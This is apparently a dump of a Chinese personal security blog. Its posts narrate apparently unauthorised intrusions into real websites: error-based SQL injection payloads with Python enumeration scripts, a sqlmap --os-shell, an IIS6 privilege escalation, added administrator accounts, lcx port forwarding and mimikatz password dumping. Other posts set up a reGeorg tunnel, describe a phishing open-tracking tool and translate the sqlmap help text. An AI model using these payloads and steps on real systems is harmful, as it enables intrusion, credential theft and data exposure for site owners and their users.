1http://xxx.com/pc/category/index/id/48) union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 %23.html 尝试报错注入时间到了晚上，多亏了漂亮仔师傅的提醒，还有这么一种一直被自己忽略的注入，传送门：报错注入，学习了一下,开始构造语句： 暴库1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,schema_name,0x7e))) from information_schema.schemata limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html - 爆出库名fangbiao，一共就两个，还好库不多 爆表1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema=0x66616E676269616F limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html 总共有42张表，一个一个手动弄出来得累死，写了个脚本，表名结果太多我就不全列出来了 123456import reimport requestsfor i in range(0, 43): Response = requests.get('http://xxx.com/pc/category/index/id/48)%20and(select%201%20from(select%20count(*),concat((select%20(select %20(select%20concat(0x7e,table_name,0x7e)))%20from%20information_schema.tables%20where%20table_schema=0x66616E676269616F%20limit%20{0},1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a'.format(str(i))) array=(re.findall(&quot;violation: 1062 Duplicate entry '~(.*?)~1' for key&quot;, Response.text)) print(array[1]) 爆列这里就遇到一个坑了,继续构造正常的报错注入语句，url太长，超出服务器接受范围，直接报错400，又没了头绪，卡住 1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema=0x66616E676269616F and table_name=71735F61646D696E5F6D656E75 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html 此时已经第二天上午，突然想到能不能给它缩短下，如果去掉表名限制，那么就是查出库里所有的列，试了一下，果然，成功爆出来了列名 1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema=0x66616E676269616F limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html 这里测了下，405个列，果断掏出脚本改改就安排上了 123456import reimport requestsfor i in range(0, 406): Response = requests.get('http://xxx.com/pc/category/index/id/48)%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,column_name,0x7e)))%20from%20information_schema.columns%20where%20table_schema=0x66616E676269616F%20limit%20{0},1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a'.format(str(i))) array=(re.findall(&quot;violation: 1062 Duplicate entry '~(.*?)~1' for key&quot;, Response.text)) print(array[1]) 完美跑出了405个列，仔细看了看结果，选几个看起来特征比较明显的来测吧，没必要全部测试 1234usernameuser_passuser_nicknamehas_admin 爆数据1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,字段名,0x7e))) from fangbiao.表名 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html 我的想法是用以上url，先固定一个列名，然后遍历所有表名，如果当前列在当前表名中，就会有数据内容返回 本来想继续用脚本，思路就是脚本里按行读取tables.txt（按行存放的表名）的每一行内容，去拼接url，然后获取返回内容中有没有数据，结果返回的内容全为400了 这里用burp的爆破功能，可以达到一样的效果，唯一的不足之处就是要手动查看返回包了，尝试下user_pass，发现出来了数据，其他获取数据方法同理 收工爆破出来的后台登陆地址被302跳转了，然后就没再测下去，其实也没心思再看下去了，这两天基本全在弄这个东西，之所以坚持要搞出来也是因为想弄清楚报错注入的利用方式，这次折腾完了又收获不少，文章看似很顺利，但是亲自上手就会发现坑真的不少，总结一下，留做纪念吧。（啥时候才能变成dalao啊）","link":"/2019/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"title":"记一次渗透提权03服务器","text":"过渡。 GetShell站点是批量测注入的时候发现的，随手测了下后台就是admin，登陆进去发现有两处应该可以拿shell 备份文件备份功能稳不稳定不知道，怕把站点搞死，最后还是通过备份成功getshell的 XD 图片上传测试了修改文件类型，00截断，.asa、.cer….等无效，而且上传的文件名自动转换时间戳重命名，遂放弃。 不过有意思的是，右键源代码把编辑器揪出来了，开发把编辑器隐藏显示了，如下图（display:none改成on后即可显示，然鹅没有卵用，并不正常显示） 知道是eWebEditor的编辑器，编辑器后台地址：http:127.0.0.1/pluck%60edit/admin/login.asp，尝试了爆破，弱口令，默认备份mdb下载均无果也放弃了。（后来进去翻到账号就是建站公司的英文名字，密码加了个三位数，信息搜集对于爆破这一块还挺重要的） 提权权限提升进去大马（站点仅支持asp），可以直接执行cmd，就是权限很低 systeminfo直接看打了什么补丁，拿exp先怼怼看，复制下来补丁信息，扔进去 提权辅助这个网页里比较下，可以使用 IIS6.0 的一个 exp，传到可读写目录里，我这里就是 C:\\wmpub ，然后就用 IIS6.0.exe 执行命令，发现是system权限了，同样的方法添加一个管理员帐号。 远程连接由于主机在内网，开放的就是3389端口，我们只需要将主机的3389端口转发出来，就可以连接上去 端口转发工具：lcx （具体使用方法移步：传送门） 公网主机： 1lcx -listen 2222 6666 肉鸡： 1lcx.exe -slave 公网主机ip 2222 127.0.0.1 3389 然后公网主机连接127.0.0.1:6666，发现连接失败，我丢。。。。（quser查询有一个前几天在线的管理，logoff踢掉了，然鹅还是上不去） 就到这里吧。","link":"/2019/02/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%8303%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"记一次渗透提权某影视站","text":"前几天看到个问题：渗透的本质是什么？我觉得渗透的本质就是人与人之间的博弈。 起因打开服务器上批量了一晚上的结果，发现这么一个影视网站，啧啧，查了下权重3，不过是反射，补天不要反射也没什么用啊，看看有没有什么好看的爱情动作电影吧 这种影视站，多半有些让人害羞的东西，然后打开网站的伦理分类： http://无敌/打码/m.aspx?id=10 ，哇舒服了~ 注入加账号随手加个'单引号，报错了，但是还不能确定 然后and 1=1页面正常，and 1=2页面里的小片片全没了，八成存在注入 丢到 sqlmap里，这就注入过程就不写太详细了 这个是用户表，感觉应该会有好多数据，而且内容也很全，胆子小没敢dump 但是不甘心就这么完了，看了看当前用户为sa 1sqlmap.py -u http://无敌/打码/m.aspx?id=10 --batch --current-user --current-db 直接–os-shell，运气这东西真没法说，我第一次真实渗透环境下成功使用这个命令 这是直接就可以添加用户的节奏，不过先不急，看看开没开远程端口 1nmap 远程ip -p1-10000 3389开放，尝试连接是可以弹出远程登陆界面的，所以我们就直接加账号了，下图可以看到添加成功了 成功登陆成功登陆上去 quser查了下，2019.2.20管理登陆过一次，一直还没注销呢，应该可以抓出密码，传上mimi神器，这里就在本机运行了 使用方法：传送门 意外密码刚抓出来，还没等我复制到本地保存呢，意外发生了 应该是管理登陆了吧，不过被发现也不是不可能，等晚一点再看看，有人叫我把管理挤下去，我觉那就直接暴露了，在等等看吧，权限没有掉的话，有可能会继续更新。 成功等到了半夜，强制连接一波，这个方法可以突破最大连接数 1mstsc /admin 还好权限没掉，我又进来了，打开mimi抓了一下，有结果了，复制到本地查看 打完收工，这个网站只有种子，下载下来也没什么用，擦擦屁股走人了。。。","link":"/2019/03/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%9F%90%E5%BD%B1%E8%A7%86%E7%AB%99/"},{"title":"起点","text":"新的起点，新的开始俨然已经两年之久的时光从Zblog到WordPress再到现在托管到GitHub的Hexo博客换了又换 不过很庆幸自己能够坚持写下来所以两年才能有些沉淀 翻看之前写的文章不由得感慨两年的成长历历在目有开心，亦有悲伤 最后，想说不忘初心续写属于自己的故事","link":"/2017/11/21/%E8%B5%B7%E7%82%B9/"},{"title":"迟来的年度总结","text":"不知道现在写年度总结是不是晚了点。 2019 2019年，一切都顺顺利利，做了人生第一份实习工作，进了一些交流的小圈子，认识了些真正的”师傅”，通过论坛，公众号，QQ、微信群、小密圈等各种渠道，每天都能被动、主动的学习到各种思路和知识，做了些技术沉淀，但还是总会感觉欠缺一些东西，那就是自己的定位和发展方向。 渗透测试这条路当初既然选择了就要坚持走下去，面临知识面”深度”和”广度”的发展问题，一直是我比较迷茫的问题。 选择”深度” 找一个领域，深入研究，争取几年以后达到一定境界，最好是这个领域中相对领先的位置，但是感觉自己又没这么聪明，一直以来的学习，都是在模仿已有的东西，自己研究的少之又少。 选择”广度” 这更适合工作场景中的需求，为了达到目标要求，不择手段，需要大量的实战经验和知识面来做支撑，难易程度一点不亚于前者，或者更甚。搞渗透测试要考虑的也是一个面，要做的就是在面上找一个突破点，这个突破点不应仅仅局限在web上，所以自然而然的就要去了解一些特别的攻击手法，这也就是为什么会有”广度”的存在。这种感觉尤其在我看到的、了解的东西多了之后就越发的清晰了。 2020 我的答案 最近在关注一个用匿名ID的师傅写的博客，匿名可能是工作性质的原因吧，里面记录的那些内容，读完多多少少有一些共鸣，自己也找到了问题的答案，一名合格的”黑客”，在必须追求”广度”的同时，还应该合理发展自己的”深度”，这两个实际上是不冲突的，只不过是要多付出一些精力在自己比较擅长的方向，坚持做下去，耐心点总会做出成绩。 未来计划 会继续修炼web（入门容易深入难） 拓展内网渗透这个新的方向（横向，免杀，维权） Python（思路清晰，编码高效） 最终目标 争取实现一套有着自己独到见解且相对完善的渗透测试体系","link":"/2020/01/09/%E8%BF%9F%E6%9D%A5%E7%9A%84%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"},{"title":"配置reGeorg+Proxifier渗透内网","text":"使用环境内网环境，防火墙DMZ区域映射外网端口，使用常规lcx等反弹工具会被各种安全软件拦截，尝试各种提权无果，这个时候就需要一款内网代理和端口转发工具，穿越防火墙的阻挡直连内网。 需要的工具Windows：reGeorg + Proxifier (软件自行搜索下载) Linux/MacOS：reGeorg + proxychains（本文暂不介绍） 配置reGeorg先将reGeorg的对应脚本上传到服务器端，reGeorg提供了PHP、ASPX、JSP脚本，直接访问显示“Georg says, ‘All seems fine’”，则表示脚本运行正常。 然后运行 reGeorgSocksProxy.py 这个py脚本，命令格式是（端口可以自定义）： 1python reGeorgSocksProxy.py -p 8080 -u http://url/tunnel.jsp 这个端口就是你所使用的本地代理端口，待会我们将使用 Proxifier这个工具进行全局的代理，将你指定的任何软件的流量代理到你本地的 xxxx 端口，然后我们的流量就会经过刚刚的脚本文件到了内网的服务器，我们就可以访问内网了。 有些端口可能会不成功，这是随着不同的主机定的，推荐使用 8080 或者 8808 。 如果我们这个脚本成功运行，你就会看到如下的图像： 配置 ProxifierProxifier能真正的实现全局的代理，你系统得每一个访问他都能代理，不仅如此，他还可以自己选择想要代理的任何软件，非常的方便，于是它也就成了windows下代理的神兵利器。 1.配置代理服务器：找到左上角菜单栏的第二个选项profile ，点开找到第一个选项 Proxy Server 点开就会弹出下面的对话框，然后你就按照你之前使用 reGeorg 的使用选定的端口进行配置（这里就是本机即127.0.0.1） ，这里我选择的是8080端口。 2.配置需要代理的软件这里不推荐实现全局代理，个人认为没有必要也不能达到最佳的性能，当然最重要的是非常的不方便，我们很多软件由于代理到内网都没法连接外网，于是就不能使用了。 （切记将python.exe添加例外，不然会死循环） 点开左上角第二个profile选项，选择Proxification Rules，将默认模式(Default)设置为不走代理的直接连接，然后选择需要代理的软件（如下图配置样例所示：我代理的分别是IP和端口扫描的工具） 代理成功后的界面（此为全局代理的截图，仅仅展示效果）： 实例应用shell中看到主机为内网IP 尝试扫描这台主机","link":"/2019/02/03/%E9%85%8D%E7%BD%AEreGeorg+Proxifier%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91/"},{"title":"鱼叉攻击|使用Lnk文件的另类钓鱼方式","text":"Hey, password is required here. 60a13925d46354e3c1b9aa984b9eaf9066ac7a8ed9b3f8311475aa9b656c0c6cb67fd62584250b5f70e1534e6acd923ed400d8b00febcb6e2af442161de0bfabb7b7a22e8c3d9161dd7027da92ac92fe223b1deb3d800d6d4bec059945898427bf7de58ea0c39595e0ee422c22019309ca3ea54fe9fb113d930f6b0b150249fecb94cb26c74df089102e8c7a3bb8f2dab2c9b01f64c7c394f1e8e377ad2401f86cef116145507c114bb964bc800a340dac05a8b60241783abafcad6737b8f88a55fdd09f4083a05e06df1f0cf8b8c630a63bb7f75ca3df6756f81c889af656bb77856417d7eeea7d73e4fde9414b0353960e0c16fad44752fbe22830cab8aafd510c40b58c233a8ba23f59612192e9c6491721c9c62595662bfd4796dac9abebf7cb19435a7ef6b40fec6eee85c67faf8d3f271efe9a7ef0ce4ccc344a61163bdca2aaba2e895d527fa0978901170d648b1f450f50b25d603f002aeece4be97588a2932879c85e0325690e08bb63add5e1b20049493071cfe90bcf14d13f875c18fab445603380958fb2f376317ad69c6fd4cbc9d33afa7412e63946a495cdf7a417b1990d246e054d278d24c5153f51ff970731b65b4b689410f580570f9f8e3a9f73bec92c0b70bcd49f4433c1e06bd7e5e4edd0c58cf7841682a7ff5111fcbc0a56f67d879229a682b8b60f8bcec11372b169e616c482f079994f53c7b8788677fb1722aa5bb1c698250585031b0c5caa312f98fce68268e563e7de65ad9a79982a94c41fea9289c93766d44d281b428fc45ced665f4a4323d2f733c9072259f06d614074f5876bd73d0b1624420c60ef7686dc02553d1b2c5e18ace329318fceb78d3bc49cbcab3f19949a805e4640ad45f828340e02e697120ffd22c8f92701e654fd33f7a1a111947f18dc5469498fdde9302640c85d3584dbcfc505d5605b766ac57a4c3be045f7ff78194d3cfa69c3be4f48d61840c226451cf7aaa3d3ec02b11a63f8a996658968e399e0e98da2afedb7e0d98719fd4a55e415c99f14b95c172e4dd2fa6656bef00a60bba994f72b5dc5dbac6be7627a740a1f8e713adf9f7ae230fe7ef44b4c27b7ac2553847682d5f7ad5bdd913b1302fe5d15880e789624bfb096f457f01033878ff595c15eaf88c215dd0130023687ae4ae0eace0dfb0ab731a310624b1bd92953fa7f171ff0dd69b26ff31cbaddbaddd3a6f85e63d0c7480e2682da9ef12d87dfa5558358e86d542c62372bdd8b324549a7f432838112e9e1447f3226c6b40b6dd0df179bc480f9d27a95b7e38627d2746160883a4b8a04542491e52b1875a8e71de625d64ccf39cf7100950f1c71caad7a05ada2252bc0beedb270c445308395158317b5b40d71d68c9435a33b64a7b8adddb471a0db5ead48e605630f2d9e10a43b22b61e5ebba00803e8c6473f7cb920af85ffd8a0c1cb55128c2fe6b1d6d3a38eca07650cc00ceebfcd8001177d5b6385e2ffb272faea39b74045025eee12464a925e32d01a2f52cd9aba5c7e75f4b5b0df5a8e5509f2ef01aef1b4573b2526935ed1b75a0764f81bf3d5fc24732d085b93b0a4e4949ecbb86963e7a9d1fa3ba6065caa79f871fa8ce363cffbd92942cb5406fd60a5d6b27e0d5d8140fc153b0e04669ad14ebbf773ddddf23e15193d3090552c0331de91b1651c1a84d3b6c7b1be4aa4b8fe1a283550dccbbd2b8d29e19c02434a0f3fbe53754292635b4ba08f0615721f131dbbfd30850692c0d6680271a3a0e42fa21113dc21d76950b0e5d41182849449621821cd74ed34ca3889dae7ba682405f88fd5f931627e72d37a56ab7cfcdf53d4e00d5341604f1651ae147ee82be71eaa6a387a3f82920d57c1c9b2aa9cd89ab14ae23e6e7cc8bf68827ae4d1e52d51f1a610df11f39ee5a10029394163320310826b229b6f42dacbfa5c515c359681d79d3c7f060d6cfc65c3b2ffd315d9a77a200f476502b70901d88a293b0bb7d9151e8bc41d3afe32bb11865d0099cf62f6bde2faef2c566a6b944fa7bb19563237ef552bded9b25293b154d0cab21d761bd6c293718183bb4b7f73c349bb8aa1674b7ab5777ea7a7d79fab879052ecf2e481bbe2a2fade9de7acb162067538c2b843d926a78aa4c18150c8b1ebfe7d832426ad2e4ed2338c1e58a544bb3a53e4398bb2d0553e145700e2784781fbc0c527754d3ae4ea98620af6e11be7cd79af2937eb647bc2cf6870e29886772e020eb386c3d073351b503066ce0c364bed838e23f9e22ee99896c3ab9bbd7850dc4261709dbec9f6076f74b294d01e2a6b8f4e7e420d4689354459eef7fc9195b664ce687b8bcd7d106973f8e4cc3c937401dd4780a1c7592cd5da9a096eabe4fada8a61760bf7b7b7bc05f7829f07a075a092a3ddc6955ff239d45514ecbceea1d2f469f038d317b03c860225daba43f9d451db8b3920923aa4cf7cf18358dfc1a2317ef6b575234feb2984cb776e68a19b7eb14de2ca26d7ed2152fb1bd56c76825335b5f9606448c959eaf095d391598ef85768f48f475682812ec8ea9a45c64c43da2fddf0b90d2927983ce66472777b94d79da54a0eba87b6157ba7971274662e3e1f3e40d825a46c92653e0ed0e84d90917770b3318635447c0e53114e5c098cd03d4ebe4026946055ddc5db3437da376cf443b2017666f70fed1a8635e1442fe40df2f23d7c70c38d597436a5c98207aff9395cb0150c419cd73e87e38126943e5b370d7ff638d447e30a1084e31dfb1419650428207321bc4669d524e6f41cea124805ec0cbfa06d97a3bd4dc3c92199d765cea6afc88b7adef161bb3dc21e44a97ba1a2d8dcf229431e3082e5d1bdd4492261babaf30a2d3c62a9e390fd3899bc2a2b4bf5be27118b6fe048e4e5199984ea033945ab9dc7e9fc3d710b936b8b47c643b8b84804b531a0ca58871d57e6aebc84c1d7cbf39c440c0d68d258dd81bc011221ed741d2a362b05c1c4479f6c67c959d2388925bab99fb52713ffaef078d7fdc9a72c83ac299679c42d3d2a9d0a65a7fd746a19b2e1145e5662e6e90e35c9f90470b4866098d17a4a68cb93848f7dc56624a550e63c011c79b37f3a7e1172c59a1da9bbb2eda3d10e4043557cb5b159a78a6b2528f43ead9f78636982899146b59f7b4c42c9571dc25192d76dd5cee312937a18c560d0dbf0d53de90d08f533eca6a9b09d9e7ce8c75c666f7d7e4de9599d677bc8416b1e358ca6fc3813a7c0396cb4c7e1ba1fa0f50e58bd5fe56c5a39770355ac25718786c295205872cb1d2515727eef69b7e7444106dfb3cec58c62693720ba52b942079a8c9ce952904b4d9ea21345efe61866923b32e66f4192f30c68247c495cd3f383db0b6ec6f7b16f54eaa18174018e66ec1f3c5757d8df65f9074d3d099ffab1d764cb9c7b32002bbf2aba24e0a71024354dc4376a0cf4081e43387eaeb1ac312382f2cb01d1fa35368755db065fb72e2c739f65c512913661b09709bc90d19125a0bfc0af67517350babd0ee2efda3e4afdc833548885a1241f6a912dc402d519f25559a8ba011bc0a6290fd4e43d2c66e9181c49bef7022dae2f72b81a3f34bc5132624d48444940404af3aa3985262af54637aec2d8d29cb749cefb44f0a9f43a012caf75fc020fb9563ee3a36cbee6a0242d5c101a507ef336a59aec8bf7cbe0c3d7744ab36c4324bb8375555fa35274ff3083283d501ca2ae92d6a62d7a2474598d595e6fbe02fec66437f28ed038a0f99a4921fedc907e3fbe8bd60b54699b2d1c5504eec503c7bddd4233670ccf1b79d2e1bbe2d89f199e144e449fc32648537ad64dd26e7250daba3ef76e6e1fd078189ad1ddf695da380ab4d0a110e996a9e07182c960d1a1a58d47b3224f513bed8fbe5042200ad4566a3111f774795cbe11f66910b480c8e298e6f58db00ce240d08fbdaa3736b298d0c191783701fbfb4710eac46e3d5e387d1eea4b1d9e248aa1da93c5e1e7799776171ca851ab4a9c52ac9ec613fe6f5feec3e5a3b17240ba915ff4591d66719bbd202bfa0c4df6afb1a48fa3a837742b16416c511b4ad30aaa2fb86fc176b96da3723c56a70ffe01a8c6723afb14fd572a99e0d32208a50f030dd8cfcbe03e253794410e93228121724ec106e69e7fff49b750de8029939beb5dc41e54f5e739b69d63d4abff1337d58b81554a8438ec71a082b8c8e4208cc07500653b2d8f945e3602ea6d42ffd3bbdeae7f2a2aa67c69c99cf4f57fac05e5f3ec7c9ab436cd8367","link":"/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/"},{"title":"鱼叉攻击|Mail-Probe 邮箱探针后台管理系统","text":"好的鱼竿和诱饵固然重要，但真正把鱼儿和渔夫联系起来的是小小的浮漂。 效果预览平常去河边钓鱼，要使用浮漂才会知道这条河是否有鱼吃饵料，同理当邮件投递出去后，此探针可以判断目标是否点击了邮件，不至于那么的苦等。 后台登录 信息查看 链接生成本程序通过php中的readfile() 函数读取本地图片，如使用自定义图片请替换public目录下的info.png，这里的图片可以使用目标公司的logo。 配置相关 基于ThinkPHP 6开发 运行环境要求Apache和PHP7.1+ 数据库文件为mail.sql 数据库及其他配置修改env文件即可，默认为 1234567891011121314151617APP_DEBUG = false[APP]DEFAULT_TIMEZONE = Asia/Shanghai[DATABASE]TYPE = mysqlHOSTNAME = 127.0.0.1DATABASE = mailUSERNAME = rootPASSWORD = rootHOSTPORT = 3306CHARSET = utf8DEBUG = false[LANG]default_lang = zh-cn 后台默认账号密码（密码修改直接替换库中MD5即可） 1admin|123456 下载地址 感谢@c1y2m3 分享的思路","link":"/2020/09/30/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Mail-Probe%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"title":"sqlmap帮助文档","text":"Usage: python sqlmap.py [options] Options（选项）: -h, –help Show basic help message and exit 显示此帮助消息并退出 -hh Show advanced help message and exit 展示先进的帮助信息并退出 –version Show program’s version number and exit 显示程序的版本号并退出 -v VERBOSE Verbosity level: 0-6 (default 1) 详细级别：0-6（默认为1） Target（目标）: At least one of these options has to be provided to define the target(s) 以下至少需要设置其中一个选项，设置目标URL。 -d DIRECT Connection string for direct database connection 直接连接到数据库。 -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) 目标URL。 -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file 解析目标(s)从Burp或WebScarab代理日志文件 -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file 解析目标(s)从远程站点地图文件(.xml) -m BULKFILE Scan multiple targets given in a textual file 扫描文本文件中给出的多个目标 -r REQUESTFILE Load HTTP request from a file 从文件加载HTTP请求 -g GOOGLEDORK Process Google dork results as target URLs 处理Google dork的结果作为目标URL。 -c CONFIGFILE Load options from a configuration INI file 从INI配置文件中加载选项。 Request（请求）: These options can be used to specify how to connect to the target URL 这些选项可以用来指定如何连接到目标URL。 --method=METHOD Force usage of given HTTP method (e.g. PUT) 强制使用给定的HTTP方法（e.g. PUT） --data=DATA Data string to be sent through POST 通过POST发送的数据字符串 --param-del=PARA.. Character used for splitting parameter values 用于拆分参数值的字符 --cookie=COOKIE HTTP Cookie header value HTTP Cookie头的值 --cookie-del=COO.. Character used for splitting cookie values 用于分割Cookie值的字符 --load-cookies=L.. File containing cookies in Netscape/wget format 包含Netscape / wget格式的cookie的文件 --drop-set-cookie Ignore Set-Cookie header from response 从响应中忽略Set-Cookie头 --user-agent=AGENT HTTP User-Agent header value 指定 HTTP User - Agent头 --random-agent Use randomly selected HTTP User-Agent header value 使用随机选定的HTTP User - Agent头 --host=HOST HTTP Host header value HTTP主机头值 --referer=REFERER HTTP Referer header value 指定 HTTP Referer头 -H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;) 额外header --headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;) 额外header --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) HTTP认证类型(Basic, Digest, NTLM or PKI) --auth-cred=AUTH.. HTTP authentication credentials (name:password) HTTP认证凭证(name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file HTTP认证 PEM认证/私钥文件 --ignore-401 Ignore HTTP Error 401 (Unauthorized) 忽略HTTP错误401(未经授权) --proxy=PROXY Use a proxy to connect to the target URL 使用代理连接到目标网址 --proxy-cred=PRO.. Proxy authentication credentials (name:password) 代理认证证书(name:password) --proxy-file=PRO.. Load proxy list from a file 从文件中加载代理列表 --ignore-proxy Ignore system default proxy settings 忽略系统默认代理设置 --tor Use Tor anonymity network 使用Tor匿名网络 --tor-port=TORPORT Set Tor proxy port other than default 设置Tor代理端口而不是默认值 --tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5) 设置Tor代理类型 --check-tor Check to see if Tor is used properly 检查Tor是否正确使用 --delay=DELAY Delay in seconds between each HTTP request 每个HTTP请求之间的延迟（秒） --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) 秒超时连接前等待（默认30） --retries=RETRIES Retries when the connection timeouts (default 3) 连接超时时重试（默认值3） --randomize=RPARAM Randomly change value for given parameter(s) 随机更改给定参数的值(s) --safe-url=SAFEURL URL address to visit frequently during testing 在测试期间频繁访问的URL地址 --safe-post=SAFE.. POST data to send to a safe URL POST数据发送到安全URL --safe-req=SAFER.. Load safe HTTP request from a file 从文件加载安全HTTP请求 --safe-freq=SAFE.. Test requests between two visits to a given safe URL 在两次访问给定安全网址之间测试请求 --skip-urlencode Skip URL encoding of payload data 跳过有效载荷数据的URL编码 --csrf-token=CSR.. Parameter used to hold anti-CSRF token 参数用于保存anti-CSRF令牌 --csrf-url=CSRFURL URL address to visit to extract anti-CSRF token 提取anti-CSRF URL地址访问令牌 --force-ssl Force usage of SSL/HTTPS 强制使用SSL / HTTPS --hpp Use HTTP parameter pollution method 使用HTTP参数pollution的方法 --eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码 &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) Optimization（优化）: These options can be used to optimize the performance of sqlmap 这些选项可用于优化sqlmap的性能 -o Turn on all optimization switches 开启所有优化开关 --predict-output Predict common queries output 预测常见的查询输出 --keep-alive Use persistent HTTP(s) connections 使用持久的HTTP（S）连接 --null-connection Retrieve page length without actual HTTP response body 从没有实际的HTTP响应体中检索页面长度 --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) 最大的HTTP（S）请求并发量（默认为1） Injection（注入）: These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts 这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER Testable parameter(s) 可测试的参数（S） --skip=SKIP Skip testing for given parameter(s) 跳过对给定参数的测试 --skip-static Skip testing parameters that not appear to be dynamic 跳过测试不显示为动态的参数 --param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;) 使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;） --dbms=DBMS Force back-end DBMS to this value 强制后端的DBMS为此值 --dbms-cred=DBMS.. DBMS authentication credentials (user:password) DBMS认证凭证(user:password) --os=OS Force back-end DBMS operating system to this value 强制后端的DBMS操作系统为这个值 --invalid-bignum Use big numbers for invalidating values 使用大数字使值无效 --invalid-logical Use logical operations for invalidating values 使用逻辑操作使值无效 --invalid-string Use random strings for invalidating values 使用随机字符串使值无效 --no-cast Turn off payload casting mechanism 关闭有效载荷铸造机制 --no-escape Turn off string escaping mechanism 关闭字符串转义机制 --prefix=PREFIX Injection payload prefix string 注入payload字符串前缀 --suffix=SUFFIX Injection payload suffix string 注入payload字符串后缀 --tamper=TAMPER Use given script(s) for tampering injection data 使用给定的脚本（S）篡改注入数据 Detection（检测）: These options can be used to customize the detection phase 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 --level=LEVEL Level of tests to perform (1-5, default 1) 执行测试的等级（1-5，默认为1） --risk=RISK Risk of tests to perform (1-3, default 1) 执行测试的风险（0-3，默认为1） --string=STRING String to match when query is evaluated to True 查询时有效时在页面匹配字符串 --not-string=NOT.. String to match when query is evaluated to False 当查询求值为无效时匹配的字符串 --regexp=REGEXP Regexp to match when query is evaluated to True 查询时有效时在页面匹配正则表达式 --code=CODE HTTP code to match when query is evaluated to True 当查询求值为True时匹配的HTTP代码 --text-only Compare pages based only on the textual content 仅基于在文本内容比较网页 --titles Compare pages based only on their titles 仅根据他们的标题进行比较 Techniques（技巧）: These options can be used to tweak testing of specific SQL injection techniques 这些选项可用于调整具体的SQL注入测试。 --technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;) SQL注入技术测试（默认BEUST） --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) DBMS响应的延迟时间（默认为5秒） --union-cols=UCOLS Range of columns to test for UNION query SQL injection 定列范围用于测试UNION查询注入 --union-char=UCHAR Character to use for bruteforcing number of columns 用于暴力猜解列数的字符 --union-from=UFROM Table to use in FROM part of UNION query SQL injection 要在UNION查询SQL注入的FROM部分使用的表 --dns-domain=DNS.. Domain name used for DNS exfiltration attack 域名用于DNS漏出攻击 --second-order=S.. Resulting page URL searched for second-order response 生成页面的URL搜索为second-order响应 Fingerprint（指纹）: -f, --fingerprint Perform an extensive DBMS version fingerprint 执行检查广泛的DBMS版本指纹 Enumeration（枚举）: These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。 -a, --all Retrieve everything 检索一切 -b, --banner Retrieve DBMS banner 检索数据库管理系统的标识 --current-user Retrieve DBMS current user 检索数据库管理系统的标识 --current-db Retrieve DBMS current database 检索数据库管理系统当前数据库 --hostname Retrieve DBMS server hostname 检索数据库服务器的主机名 --is-dba Detect if the DBMS current user is DBA 检测DBMS当前用户是否DBA --users Enumerate DBMS users 枚举数据库管理系统用户 --passwords Enumerate DBMS users password hashes 枚举数据库管理系统用户密码哈希 --privileges Enumerate DBMS users privileges 枚举数据库管理系统用户的权限 --roles Enumerate DBMS users roles 枚举数据库管理系统用户的角色 --dbs Enumerate DBMS databases 枚举数据库管理系统数据库 --tables Enumerate DBMS database tables 